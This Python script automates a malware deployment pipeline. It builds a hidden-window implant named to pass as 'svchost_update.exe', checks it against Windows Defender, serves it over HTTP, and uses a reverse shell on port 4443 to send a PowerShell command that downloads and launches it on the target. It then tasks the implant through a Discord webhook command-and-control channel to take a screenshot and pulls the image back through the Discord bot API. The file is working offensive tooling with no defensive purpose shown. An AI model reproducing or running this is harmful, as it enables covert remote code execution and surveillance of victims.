"""
auto_screenshot_test.py — Automated screenshot test pipeline
22DIV / george wu

Does everything:
1. Compiles discord_implant.py into standalone .exe (PyInstaller)
2. Starts HTTP server to serve the .exe
3. Listens for Radon's persistent shell on port 4443
4. Deploys the .exe to Radon via the shell
5. Waits for new Discord beacon
6. Sends SCREENSHOT command via Discord webhook
7. Polls Discord for screenshot attachment and downloads it

Usage:
    python auto_screenshot_test.py
"""

import os
import sys
import json
import time
import struct
import socket
import shutil
import subprocess
import threading
import urllib.request
import urllib.error

ROOT = os.path.dirname(os.path.abspath(__file__))
AGENT_DIR = os.path.join(ROOT, "agent")
IMPLANT_SRC = os.path.join(AGENT_DIR, "discord_implant.py")
DIST_DIR = os.path.join(AGENT_DIR, "dist_py")
EXE_NAME = "svchost_update.exe"
SERVE_PORT = 8890
C2_PORT = 4443
MY_IP = "192.168.1.92"
TARGET_DEPLOY_PATH = r"C:\Users\Public\svchost_update.exe"
SCREENSHOT_OUT = os.path.join(ROOT, "screenshots")

# read config from discord_implant.py source
WEBHOOK_URL = None
BOT_TOKEN = None
CHANNEL_ID = None
with open(IMPLANT_SRC, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        stripped = line.strip()
        if stripped.startswith("WEBHOOK_URL") and "=" in stripped and "discord.com" in stripped:
            WEBHOOK_URL = stripped.split('"')[1]
        elif stripped.startswith("BOT_TOKEN") and "=" in stripped and not stripped.startswith("#"):
            BOT_TOKEN = stripped.split('"')[1]
        elif stripped.startswith("CHANNEL_ID") and "=" in stripped and not stripped.startswith("#"):
            CHANNEL_ID = stripped.split('"')[1]

# also check .env files as fallback
env_paths = [os.path.join(ROOT, ".env"), os.path.join(AGENT_DIR, ".env")]
for ep in env_paths:
    if os.path.exists(ep):
        with open(ep, encoding="utf-8", errors="ignore") as f:
            for line in f:
                stripped = line.strip()
                if not BOT_TOKEN and ("DISCORD_BOT_TOKEN=" in stripped or stripped.startswith("BOT_TOKEN=")):
                    BOT_TOKEN = stripped.split("=", 1)[1].strip().strip('"')
                if not CHANNEL_ID and ("DISCORD_CHANNEL_ID=" in stripped or stripped.startswith("CHANNEL_ID=")):
                    CHANNEL_ID = stripped.split("=", 1)[1].strip().strip('"')

GRN = "\033[92m"
RED = "\033[91m"
YLW = "\033[93m"
CYN = "\033[96m"
DIM = "\033[90m"
RST = "\033[0m"
BOLD = "\033[1m"

def log(color, tag, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"  {DIM}{ts}{RST} {color}[{tag}]{RST} {msg}")

def step(n, msg):
    print(f"\n  {CYN}{BOLD}━━ STEP {n} ━━{RST} {msg}")


# ──────────────────────────────────────────────
# STEP 1: Compile discord_implant.py → .exe
# ──────────────────────────────────────────────
def compile_implant():
    step(1, "Compile discord_implant.py → standalone .exe")

    try:
        import PyInstaller
        log(GRN, "+", "PyInstaller available")
    except ImportError:
        log(YLW, "*", "Installing PyInstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "-q"], check=True)
        log(GRN, "+", "PyInstaller installed")

    if os.path.exists(DIST_DIR):
        shutil.rmtree(DIST_DIR, ignore_errors=True)

    build_dir = os.path.join(AGENT_DIR, "build_py")
    spec_dir = os.path.join(AGENT_DIR)

    log(YLW, "*", f"Compiling {IMPLANT_SRC}...")
    result = subprocess.run([
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", EXE_NAME.replace(".exe", ""),
        "--distpath", DIST_DIR,
        "--workpath", build_dir,
        "--specpath", spec_dir,
        "--clean",
        IMPLANT_SRC
    ], capture_output=True, text=True)

    exe_path = os.path.join(DIST_DIR, EXE_NAME)
    if os.path.exists(exe_path):
        size = os.path.getsize(exe_path)
        log(GRN, "+", f"Compiled: {EXE_NAME} ({size:,} bytes)")
        # cleanup build artifacts
        shutil.rmtree(build_dir, ignore_errors=True)
        spec = os.path.join(spec_dir, EXE_NAME.replace(".exe", ".spec"))
        if os.path.exists(spec):
            os.remove(spec)
        return exe_path
    else:
        log(RED, "!", f"Compilation failed")
        if result.stderr:
            for line in result.stderr.strip().split("\n")[-5:]:
                print(f"    {RED}{line}{RST}")
        return None


# ──────────────────────────────────────────────
# STEP 2: Defender scan
# ──────────────────────────────────────────────
def scan_exe(exe_path):
    step(2, "Defender scan")
    mp_base = r"C:\ProgramData\Microsoft\Windows Defender\Platform"
    if not os.path.exists(mp_base):
        log(YLW, "?", "Defender platform not found, skipping scan")
        return True
    versions = sorted(os.listdir(mp_base), reverse=True)
    if not versions:
        log(YLW, "?", "No Defender versions found")
        return True
    mp = os.path.join(mp_base, versions[0], "MpCmdRun.exe")
    if not os.path.exists(mp):
        log(YLW, "?", f"MpCmdRun not found at {mp}")
        return True

    result = subprocess.run([mp, "-Scan", "-ScanType", "3", "-File", exe_path, "-DisableRemediation"],
                          capture_output=True, text=True)
    if "found no threats" in result.stdout.lower():
        log(GRN, "+", "Defender: CLEAN")
        return True
    else:
        log(RED, "!", f"Defender may have flagged the binary")
        print(f"    {result.stdout.strip()}")
        return False


# ──────────────────────────────────────────────
# STEP 3: HTTP server (background)
# ──────────────────────────────────────────────
http_server = None
def start_http_server(serve_dir):
    step(3, f"HTTP server on :{SERVE_PORT}")
    import http.server
    import functools

    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=serve_dir)
    global http_server
    http_server = http.server.HTTPServer(("0.0.0.0", SERVE_PORT), handler)
    t = threading.Thread(target=http_server.serve_forever, daemon=True)
    t.start()
    log(GRN, "+", f"Serving {serve_dir} on :{SERVE_PORT}")


# ──────────────────────────────────────────────
# STEP 4: Listen for Radon shell + deploy
# ──────────────────────────────────────────────
def deploy_to_radon():
    step(4, "Waiting for Radon persistent shell...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.bind(("0.0.0.0", C2_PORT))
    except OSError as e:
        log(RED, "!", f"Port {C2_PORT} in use — close other C2 first")
        log(DIM, "*", "Kill vader_menu.py / vader_c2 if running")
        return False

    sock.settimeout(90)
    sock.listen(1)
    log(YLW, "*", f"Listening on :{C2_PORT} — Radon should connect within 30s...")

    try:
        conn, addr = sock.accept()
        log(GRN, "+", f"Shell connected from {addr[0]}:{addr[1]}")
    except socket.timeout:
        log(RED, "!", "No connection after 90s — is Radon running?")
        sock.close()
        return False

    time.sleep(1)
    # drain any banner/prompt
    conn.settimeout(2)
    try:
        conn.recv(4096)
    except socket.timeout:
        pass

    # send deploy command
    deploy_cmd = (
        f'powershell -c "Invoke-WebRequest -Uri \'http://{MY_IP}:{SERVE_PORT}/{EXE_NAME}\' '
        f'-OutFile \'{TARGET_DEPLOY_PATH}\'; '
        f'if(Test-Path \'{TARGET_DEPLOY_PATH}\'){{Write-Host \'DEPLOYED\'; '
        f'Start-Process \'{TARGET_DEPLOY_PATH}\'}}else{{Write-Host \'FAILED\'}}"\r\n'
    )

    log(YLW, "*", "Sending deploy command...")
    conn.sendall(deploy_cmd.encode())

    # wait for response
    time.sleep(10)
    conn.settimeout(5)
    try:
        resp = conn.recv(8192).decode(errors="replace")
        if "DEPLOYED" in resp:
            log(GRN, "+", "Implant deployed and launched on Radon")
        elif "FAILED" in resp:
            log(RED, "!", "Download failed on Radon")
            conn.close()
            sock.close()
            return False
        else:
            log(YLW, "?", f"Response: {resp.strip()[:200]}")
    except socket.timeout:
        log(YLW, "?", "No response — implant may still be deploying")

    conn.close()
    sock.close()
    return True


# ──────────────────────────────────────────────
# STEP 5: Send SCREENSHOT via Discord webhook
# ──────────────────────────────────────────────
def find_implant_session():
    """Poll Discord for the new Python implant's recon/heartbeat to get its session ID."""
    if not BOT_TOKEN or not CHANNEL_ID:
        return None
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=20"
    for attempt in range(8):
        time.sleep(3)
        log(DIM, "*", f"Looking for new implant beacon ({attempt + 1}/8)...")
        req = urllib.request.Request(url, headers={
            "Authorization": f"Bot {BOT_TOKEN}",
            "User-Agent": "Mozilla/5.0"
        })
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            messages = json.loads(resp.read())
            for msg in messages:
                content = msg.get("content", "")
                try:
                    data = json.loads(content)
                    if data.get("type") in ("recon", "heartbeat") and data.get("hostname") == "Radon_Laptop1":
                        sid = data.get("session", "")
                        if sid and sid != "ba3f642f":
                            log(GRN, "+", f"Found Python implant session: {sid}")
                            return sid
                except (json.JSONDecodeError, KeyError):
                    pass
        except Exception as e:
            log(DIM, "*", f"Poll error: {e}")
    return None


def send_screenshot_cmd():
    step(5, "Sending SCREENSHOT command via Discord")

    if not WEBHOOK_URL:
        log(RED, "!", f"No webhook URL found — WEBHOOK_URL={WEBHOOK_URL}")
        return None

    log(YLW, "*", "Waiting 10s for implant to beacon...")
    time.sleep(10)

    session_id = find_implant_session()
    if not session_id:
        log(RED, "!", "Could not find Python implant session in Discord")
        log(DIM, "*", "Check Discord #c2 for recon messages from Radon_Laptop1")
        return None

    cmd_payload = json.dumps({
        "type": "cmd",
        "session": session_id,
        "command": "SCREENSHOT"
    })
    payload = json.dumps({"content": cmd_payload}).encode()
    req = urllib.request.Request(WEBHOOK_URL, data=payload, headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    })
    try:
        urllib.request.urlopen(req, timeout=10)
        log(GRN, "+", f"SCREENSHOT command sent to session {session_id}")
        return session_id
    except Exception as e:
        log(RED, "!", f"Failed to post command: {e}")
        return None


# ──────────────────────────────────────────────
# STEP 6: Poll Discord for screenshot attachment
# ──────────────────────────────────────────────
def poll_for_screenshot(session_id=None):
    step(6, "Polling Discord for screenshot attachment...")

    if not BOT_TOKEN or not CHANNEL_ID:
        log(YLW, "?", "No bot token or channel ID — check Discord #c2 manually for .bmp attachment")
        log(DIM, "*", f"BOT_TOKEN: {'set' if BOT_TOKEN else 'MISSING'}, CHANNEL_ID: {'set' if CHANNEL_ID else 'MISSING'}")
        return None

    os.makedirs(SCREENSHOT_OUT, exist_ok=True)
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=15"

    for attempt in range(10):
        time.sleep(5)
        log(DIM, "*", f"Polling attempt {attempt + 1}/10...")
        req = urllib.request.Request(url, headers={
            "Authorization": f"Bot {BOT_TOKEN}",
            "User-Agent": "Mozilla/5.0"
        })
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            messages = json.loads(resp.read())
            for msg in messages:
                for att in msg.get("attachments", []):
                    fn = att.get("filename", "")
                    if fn.endswith((".bmp", ".png", ".jpg")):
                        dl_url = att["url"]
                        ext = os.path.splitext(fn)[1]
                        out_path = os.path.join(SCREENSHOT_OUT, f"radon_{int(time.time())}{ext}")
                        urllib.request.urlretrieve(dl_url, out_path)
                        size = os.path.getsize(out_path)
                        log(GRN, "+", f"Screenshot downloaded: {out_path} ({size:,} bytes)")
                        return out_path
        except Exception as e:
            log(DIM, "*", f"Poll error: {e}")

    log(YLW, "?", "No screenshot attachment found after 50s — check Discord #c2 manually")
    return None


# ──────────────────────────────────────────────
# STEP 7: Convert to PNG
# ──────────────────────────────────────────────
def convert_to_png(bmp_path):
    if not bmp_path:
        return
    step(7, "Converting BMP → PNG")
    png_path = bmp_path.replace(".bmp", ".png")
    cmd = (
        f'powershell -c "Add-Type -AssemblyName System.Drawing; '
        f"$img = [System.Drawing.Image]::FromFile('{bmp_path}'); "
        f"$img.Save('{png_path}', [System.Drawing.Imaging.ImageFormat]::Png); "
        f'$img.Dispose()"'
    )
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if os.path.exists(png_path):
        log(GRN, "+", f"PNG saved: {png_path}")
        subprocess.Popen(["explorer", png_path])
    else:
        log(YLW, "?", f"Conversion skipped — open .bmp directly")
        subprocess.Popen(["explorer", bmp_path])


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────
def main():
    print(f"\n  {CYN}{BOLD}╔══════════════════════════════════════════╗{RST}")
    print(f"  {CYN}{BOLD}║  CHEYANNE — Automated Screenshot Test    ║{RST}")
    print(f"  {CYN}{BOLD}║  22DIV / george wu                       ║{RST}")
    print(f"  {CYN}{BOLD}╚══════════════════════════════════════════╝{RST}\n")

    # step 1: compile
    exe_path = compile_implant()
    if not exe_path:
        return

    # step 2: scan
    scan_exe(exe_path)

    # step 3: http server
    start_http_server(DIST_DIR)

    # step 4: deploy to radon
    print(f"\n  {YLW}{BOLD}  ⚠  CLOSE ALL OTHER C2 INSTANCES FIRST  ⚠{RST}")
    print(f"  {DIM}  (vader_menu.py, vader_c2_v2, vader_discord_c2){RST}")
    input(f"\n  {DIM}  Press Enter when ready...{RST}")

    if not deploy_to_radon():
        return

    # step 5: screenshot command
    session_id = send_screenshot_cmd()

    # step 6: poll for result
    bmp_path = poll_for_screenshot(session_id)

    # step 7: convert
    convert_to_png(bmp_path)

    # cleanup
    if http_server:
        http_server.shutdown()

    print(f"\n  {GRN}{BOLD}  ══ DONE ══{RST}\n")


if __name__ == "__main__":
    main()
